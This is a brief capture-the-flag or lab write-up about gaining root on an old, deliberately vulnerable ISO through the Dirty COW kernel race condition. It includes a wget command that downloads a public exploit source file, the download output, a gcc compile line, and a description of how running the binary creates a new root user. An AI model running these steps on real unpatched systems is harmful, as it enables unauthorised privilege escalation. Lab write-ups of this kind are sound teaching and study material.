# Writeup 2 - Unclean Bovine (DirtyCOW)

> This writeup starts from [**Writeup 1**](../writeup1/README.md) once we get any shell capable of compiling some C code

The iso for this project is quite old, its vulnerable to the Dirty COW exploit, a privilege escalation vulnerability that exploits a race condition on the copy-on-write mechanism of older kernels (<4.8.3)

## Preparation

To use this exploit, we first need a shell. we follow the "intended solution" till we have access to a user that can compile and run a C file.  
Here we used user `laurie`.

We just use a [known dirty cow script](https://github.com/firefart/dirtycow) that sets a new user `firefart` as root.

## Running the Exploit

to use this exploit this vulnerability we must compile the copied code as indicated in the exploit's repo:
```
$> wget https://raw.githubusercontent.com/firefart/dirtycow/refs/heads/master/dirty.c
--2025-04-10 21:22:19--  https://raw.githubusercontent.com/firefart/dirtycow/refs/heads/master/dirty.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4815 (4.7K) [text/plain]
Saving to: ‘dirty.c’

dirty.c               100%[=========================>]   4.70K  --.-KB/s    in 0.001s

2025-04-10 21:22:19 (6.90 MB/s) - ‘dirty.c’ saved [4815/4815]
$> gcc -pthread dirty.c -o dirty -lcrypt
```

*Note: we can't always use `wget` as depending on the network config the machine might not have an internet, if so, we can just paste from the host machine when we use ssh to connect to the machine

we can then run the executable and wait... And after some time, the user firefart is created and we can connect as it, obtaining a root shell - **Congrats us, ~~that was pure talent!!!!~~**
